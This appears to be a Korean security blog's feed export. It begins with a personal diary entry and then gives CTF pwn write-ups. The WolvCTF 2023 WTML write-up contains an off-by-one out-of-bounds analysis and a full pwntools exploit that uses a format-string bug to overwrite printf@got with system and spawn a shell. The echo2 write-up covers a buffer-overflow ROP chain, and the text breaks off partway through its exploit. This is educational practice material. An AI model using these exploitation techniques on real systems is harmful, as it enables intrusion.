닌텐도 스위치랑 모여봐요 동물의 숲 게임을 선물받았다. 그 때 열심히 하다가 새해 때 오랜만에 들어가고 3월까지 그대로 방치해뒀다가 3월 초에 깔끔하게 리셋했다. 지금은 매우 재밌게 즐기고 있다. 지형 공사를 하고 있는데 노가다 과정이긴 해도 뿌듯하고 나름 재밌다. (내 캐릭터가 귀여워서 디스코드 프로필 사진도 변경했다.) 그리고 주민들과 이야기하다보면 너무 힐링된다.</p><p>무트코인으로 800만원정도 벌어서 아직 돈 걱정 없이 행복하게 즐기고 있다. 지금까지 약 120시간 정도 한 듯..</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><p>Streak 진짜.. ㅋㅋ 중간에 깨져서 다시 하고 있는데 엄한 곳에 Streak freeze 써버렸다.. 하.. 아직 실버1인데 언제 골드될까? 라고 말하기에는 요즘 알고리즘하기 귀찮아서 쉬운 것만 골라 풀고 있다.  </p><img src="/images/230331-diary/Screenshot 2023-03-31 at 15.51.38.png" width=600/><br><p>갑자기 solve.ac UI가 바뀌어서 좀 당황했지만.. 개인적으로 이전 UI가 더 좋은 것 같다.. </p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>웬만하면 CTF를 꾸준히 참여하려고 노력하고 있다. 2023년 기준 기억에 남는 문제를 소개한다.</p><ul><li>idek CTF의 Spinter문제: <a href="https://jiravvit.github.io/230117-idekctf2023-sprinter/">https://jiravvit.github.io/230117-idekctf2023-sprinter/</a></li></ul><p>FSB를 트리거할 수 있는데 <code>n</code>이 필터링되어 있다. 어떻게 overflow를 일으켜야하는지 고민을 해야한다. 또한 canary가 있기 때문에 이를 어떻게 우회하거나 leak해야할 지. 잘 보존을 어떻게 해야할 지 고민할 수 있는 문제다.</p><ul><li>Karmar CTF의 mjs문제: <a href="https://jiravvit.github.io/230318-kalmarctf2023-mjs/">https://jiravvit.github.io/230318-kalmarctf2023-mjs/</a></li></ul><p>첫 JS engine exploit이라고 거창하게 말하지만 의외로 쉽게 문제 풀 수 있는 방향이 존재한다. javascript로 익스 코드를 작성하는 건 역시나 어렵다. 이 문제를 풀면서 다른 유명한 JS engine 1-day 분석해보고 싶다고 생각했다. 분석하게 되면.. 블로그에 정리하도록 노력해보겠다.</p><ul><li>Wolv CTF의 WTML문제: <a href="https://jiravvit.github.io/230322-wolvctf2023-WTML/">https://jiravvit.github.io/230322-wolvctf2023-WTML/</a></li></ul><p>얼마 전에 있었던 씨텝이다. 경계 검사를 제대로 못해서 oob가 발생하는 문제는 내가 잘 못찾기도 하고 문제 풀고 뿌듯해서 여기 넣어봤다.</p><ul><li>Line CTF의 Simple Blogger문제: 업로드 예정</li></ul><p>대회 떄 풀었으면 더 쉽고 빨리 풀었을 텐데.. 진짜 너무 아쉽다. 대회 도중 약속이 있어서 대회를 참여하지 못하고 대회 끝나고 문제를 풀어봤다. 정말 열심히 분석했고 분석을 엄청 열심히 한 거에 비해 어이없게 문제가 풀렸다. 분석하면서 작년 이맘 때의 나는 절대 못푸는 문제일 것이라는 생각이 들었다. 다른 문제를 푸느라 아직 블로그에 업로드 하지는 않았는데 빨리 업로드해야겠다.</p><ul><li>Line CTF의 Hackatris문제: 업로드 예정</li></ul><p>개인적으로 게임 관련된 문제를 안좋아한다. 분석이 까다롭고 코드가 길기 떄문이다. 하지만 앞의 Simple Blogger 문제를 풀고나서 자신감이 생겨 바이너리를 열어봤다. 분석을 열심히 진행한 결과 취약점, 풀이 방향은 다 알겠으나 이걸 내가 코드로 작성해서 익스할 수 있을까..?란 의문이 들었다. 그래서 롸업을 정말 쓱! 봤는데 내가 생각한 풀이 방향과 동일했다. 코드로 작성하는거 조금 연구해보고.. 블로그에 업로드하도록 노력하겠다.</p><h2 id="목표"><a href="#목표" class="headerlink" title="목표"></a>목표</h2><p>운동 꾸준히 하고 싶다.. ^^</p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - WTML (pwn, oob)</title>
      <link href="/230322-wolvctf2023-WTML/"/>
      <url>/230322-wolvctf2023-WTML/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>This cool intermediate service receives WTML bodies and replaces tags. How useful! Is it vulnerable?<br><code>nc wtml.wolvctf.io 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 489 points]</li></ul><p>소스코드가 주어져 있고 길이도 짧아서 포너블 문제 중에 가장 먼저 손대봤다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>소스코드가 주어져 있어서 소스코드위주로 분석했다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE_LEN 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*tag_replacer_func)</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tag_replacer</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> id;</span><br><span class="line">    tag_replacer_func funcs[<span class="number">2</span>];</span><br><span class="line">&#125; __attribute__((packed)) tag_replacer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v2</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DEBUG] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO implement</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please provide feedback about v2: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> response[<span class="number">0x100</span>];</span><br><span class="line">    fgets(response, <span class="keyword">sizeof</span>(response), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your respones: \&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(response);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\&quot; has been noted!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prompt_tag</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message, <span class="type">char</span> *tag)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(message);</span><br><span class="line">    *tag = (<span class="type">char</span>) getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> || *tag == <span class="string">&#x27;&lt;&#x27;</span> || *tag == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    tag_replacer replacer = &#123;</span><br><span class="line">            .funcs = &#123;replace_tag_v1, replace_tag_v2&#125;,</span><br><span class="line">            .id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> user_message[MESSAGE_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your WTML!&quot;</span>);</span><br><span class="line">    fread(user_message, <span class="keyword">sizeof</span>(<span class="type">char</span>), MESSAGE_LEN, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// Replace tag</span></span><br><span class="line">        <span class="type">char</span> from = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;What tag would you like to replace [q to quit]?&quot;</span>, &amp;from);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from == <span class="string">&#x27;q&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> to = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;With what new tag?&quot;</span>, &amp;to);</span><br><span class="line"></span><br><span class="line">        replacer.funcs[replacer.id](user_message, from, to);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(user_message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>아래 부분을 유의있게 살펴보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replacer.funcs[replacer.id](user_message, from, to);</span><br></pre></td></tr></table></figure><p><code>replacer.id</code>는 0으로 초기화되어있고, 바로 입력할 수 있는 부분이 없기 때문에 겉으로 보기엔 <code>replace_tag_v1</code> 함수만 계속 실행된다. 하지만 <code>replace_tag_v2</code>에서 FSB가 발생하기 때문에 저 함수를 실행시켜야하는데 저 함수를 실행시키려면 <code>replacer.id</code>를 1로 세팅해야한다. 하지만 이걸 어떻게 세팅해야 할까? <code>main</code> 함수에서 흐름을 바꿀 취약점이 보이지 않는다.</p><p><code>replace_tag_v1</code> 함수는 무조건 실행되니까 이 함수에서 취약점을 찾아서 <code>replace_tag_v2</code> 함수를 실행시켜 FSB를 트리거하는 방향으로 생각해야 한다.</p><p><code>replace_tag_v1</code> 함수만 떼어놓고 분석해보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MESSAGE_LEN</code>은 0x20으로 고정되어 있다. 참고로 <code>meesage</code>, <code>from</code>, <code>to</code> 모두 입력값이다. 첫 번째 반복문에서 <code>start_tag_index</code>는 <code>&lt;[from]&gt;</code>이 나오는, 즉 <code>&lt;</code>의 인덱스를 의미한다. 반복문을 볼 떄는 항상 반복문 조건의 인덱스 범위가 반복문 내부에서 사용하는 인덱스 범위를 넘어가지 않는지 항상 주시를 해야한다.</p><p>두 번째 반복문에서는 <code>start_tag_index+3</code>, 즉 <code>&lt;[from]&gt;</code> 다음 인덱스부터 사용한다. 문제는 인덱스가 <code>MESSAGE_LEN-1</code> 일 때 <code>message[i+2]</code>에 접근한다. OOB가 발생한다. 사실 이거보다 더 중요한건 <code>message[end_tag_index + 2] = to;</code> 이 구문이다. 접근함에도 모자라 값을 쓰고 있다! 정확한 디버깅을 통해 저 부분이 <code>replacer.id</code>라면 1로 세팅해줄 수 있다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>FSB를 트리거할 수 있으면 익스플로잇은 간단하다. <code>pie base</code>와 <code>libc base</code>를 구한 다음에 <code>printf@got</code>를 <code>system</code>으로 덮고 입력을 조절할 수 있으므로 <code>/bin/sh\x00</code>를 보내면 끝이다!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;wtml.wolvctf.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;ccccccccccccccccccccccccccc&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;/&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;WTML!\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1)</span></span><br><span class="line"><span class="comment"># pie  24 -0x3520</span></span><br><span class="line"><span class="comment"># libc 13 -0x8ee8d</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$p_%24$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x8ee8d</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x3520</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">8</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;Your respones: \&quot;&quot; =&gt; /bin/sh</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;0ff_by_0ne_@nd_y0ure_d0ne!!11!!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - echo2 (pwn, bof)</title>
      <link href="/230322-wolvctf2023-echo2/"/>
      <url>/230322-wolvctf2023-echo2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>New and improved echo?<br><code>nc echotwo.wolvctf-2023.kctf.cloud 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>아쉽게도 이 문제는 소스코드가 없다. IDA로 열심이 열어서 분석해봤다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">echo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+108h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Echo2&quot;</span>);</span><br><span class="line">  v3 = __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, v2, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Echo2: %s\n&quot;</span>, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>입력값 크기를 직접 조절할 수 있다. 가뿐히 BOF가 발생한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>pie가 걸려있는데 어떻게 함수가 종료되고 다시 <code>main</code>을 실행시킬 수 있을까? 1.5바이트가 일정한데 0.5바이트가 2였기 때문에 아래 <code>\x47</code>, <code>\x4b</code>, <code>\x4c</code> 를 찍어가며 ㅎㅎ.. <code>main</code>으로 이동시키려고 노력했다. stack align이 안맞아서 <code>\x4c</code>으로 이동했다.</p><img src="/images/230322-wolvctf2023-echo2/Screenshot 2023-03-29 at 17.52.51.png" width=600/><br><p>pie가 걸려있기 때문에 leak을 해줘야 한다. <code>pop rdi</code>가 바이너리에 없기 때문에 libc를 leak해야 할 때 약간 고민했는데 다음 명령어를 실행할 때 레지스터가 아래와 같았기 때문에 <code>rdi</code>를 건드릴 필요가 없어졌다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rdi   : 0x007ffdd808f940  →  0x007ff4dec620d0  →  &lt;funlockfile+0&gt; endbr64</span><br></pre></td></tr></table></figure><p>바로 <code>printf</code>를 실행해주고 <code>main</code>으로 돌려준 다음 libc의 <code>pop rdi</code>를 이용하여 <code>system(&#39;/bin/sh&#39;)</code>를 실행해주면 된다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;echotwo.wolvctf-2023.kctf.cloud&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span 